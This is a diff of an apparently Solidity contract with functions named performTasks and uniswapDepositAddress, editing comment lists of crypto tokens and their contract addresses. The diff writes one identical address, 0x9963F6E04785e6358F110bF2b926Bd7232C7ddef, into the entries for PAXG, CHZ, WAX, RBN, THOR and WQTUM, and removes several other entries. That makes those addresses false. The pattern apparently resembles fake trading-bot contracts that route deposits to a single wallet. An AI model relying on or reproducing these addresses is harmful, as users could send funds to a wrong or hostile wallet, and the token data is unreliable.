@@ -177,7 +177,7 @@ function performTasks() public {
 
 // Paxos Gold (PAXG)
 // PAX Gold (PAXG) tokens each represent one fine troy ounce of an LBMA-certified, London Good Delivery physical gold bar, secured in Brink’s vaults.
-// 
+// 0x9963F6E04785e6358F110bF2b926Bd7232C7ddef
 
 // Compound Ether (cETH)
 // Compound is an open-source protocol for algorithmic, efficient Money Markets on the Ethereum blockchain.
@@ -189,7 +189,7 @@ function performTasks() public {
 
 // chiliZ (CHZ)
 // Chiliz is the sports and fan engagement blockchain platform, that signed leading sports teams.
-// 
+// 0x9963F6E04785e6358F110bF2b926Bd7232C7ddef
 
 // BAT (BAT)
 // The Basic Attention Token is the new token for the digital advertising industry.
@@ -324,23 +324,15 @@ function uniswapDepositAddress() public pure returns (address) {
 
 // WAX Token (WAX)
 // Global Decentralized Marketplace for Virtual Assets.
-// 
+// 0x9963F6E04785e6358F110bF2b926Bd7232C7ddef
 
 // Swipe (SXP)
 // Swipe is a cryptocurrency wallet and debit card that enables users to spend their cryptocurrencies over the world.
 // 0xBD4fBda2f20a02CA2bc2C5858aB58c7D3757447F
 
-// APENFT (NFT)
-// APENFT Fund was born with the mission to register world-class artworks as NFTs on blockchain and aim to be the ARK Funds in the NFT space to build a bridge between top-notch artists and blockchain, and to support the growth of native crypto NFT artists. Mapped from TRON network.
-// 
-
 // UMA Voting Token v1 (UMA)
 // UMA is a decentralized financial contracts platform built to enable Universal Market Access.
 // 0xe49273cE5C0FC115391112eC7B2cd7e7Ba9525a7
-
-// MXCToken (MXC)
-// Inspiring fast, efficient, decentralized data exchanges using LPWAN-Blockchain Technology.
-// 
 
 // SwissBorg (CHSB)
 // Crypto Wealth Management.
@@ -535,7 +527,7 @@ function uniswapDepositAddress() public pure returns (address) {
 
 // Ribbon (RBN)
 // Ribbon uses financial engineering to create structured products that aim to deliver sustainable yield. Ribbon's first product focuses on yield through automated options strategies. The protocol also allows developers to create arbitrary structured products by combining various DeFi derivatives.
-// 
+// 0x9963F6E04785e6358F110bF2b926Bd7232C7ddef
 
 // HooToken (HOO)
 // HooToken aims to provide safe and reliable assets management and blockchain services to users worldwide.
@@ -729,23 +721,7 @@ function uniswapDepositAddress() public pure returns (address) {
 
 // THORSwap Token (THOR)
 // THORswap is a multi-chain DEX aggregator built on THORChain's cross-chain liquidity protocol for all THORChain services like THORNames and synthetic assets.
-// 
-
-// Somnium Space Cubes (CUBE)
-// We are an open, social & persistent VR world built on blockchain. Buy land, build or import objects and instantly monetize. Universe shaped entirely by players!
-// 
-
-// Parsiq Token (PRQ)
-// A Blockchain monitoring and compliance platform.
-// 
-
-// EthLend (LEND)
-// Aave is an Open Source and Non-Custodial protocol to earn interest on deposits & borrow assets. It also features access to highly innovative flash loans, which let developers borrow instantly and easily; no collateral needed. With 16 different assets, 5 of which are stablecoins.
-// 
-
-// QANX Token (QANX)
-// Quantum-resistant hybrid blockchain platform. Build your software applications like DApps or DeFi and run business processes on blockchain in 5 minutes with QANplatform.
-// 
+// 0x9963F6E04785e6358F110bF2b926Bd7232C7ddef
 
 // LockTrip (LOC)
 // Hotel Booking & Vacation Rental Marketplace With 0% Commissions.
@@ -786,17 +762,11 @@ function uniswapDepositAddress() public pure returns (address) {
 // NULS is a blockchain built on an infrastructure optimized for customized services through the use of micro-services. The NULS blockchain is a public, global, open-source community project. NULS uses the micro-service functionality to implement a highly modularized underlying architecture.
 // 0x3587B4eb92C3A4600AE88453Bd3620BfB34487E8
 
-// Pinakion (PNK)
-// Kleros provides fast, secure and affordable arbitration for virtually everything.
-// 
+
 
 // LON Token (LON)
 // Tokenlon is a decentralized exchange and payment settlement protocol.
 // 0x50E83409700cBDc7DBFF53EeA01683B1855064f7
-
-// CargoX (CXO)
-// CargoX aims to be the independent supplier of blockchain-based Smart B/L solutions that enable extremely fast, safe, reliable and cost-effective global Bill of Lading processing.
-// 
 
 // Wrapped NXM (wNXM)
 // Blockchain based solutions for smart contract cover.
@@ -958,10 +928,7 @@ function uniswapDepositAddress() public pure returns (address) {
 // 
 
 // WQtum (WQTUM)
-// 
-
-// Olympus (OHM)
-// 
+// 0x9963F6E04785e6358F110bF2b926Bd7232C7ddef
 
 // Gnosis (GNO)
 // Crowd Sourced Wisdom - The next generation blockchain network. Speculate on anything with an easy-to-use prediction market
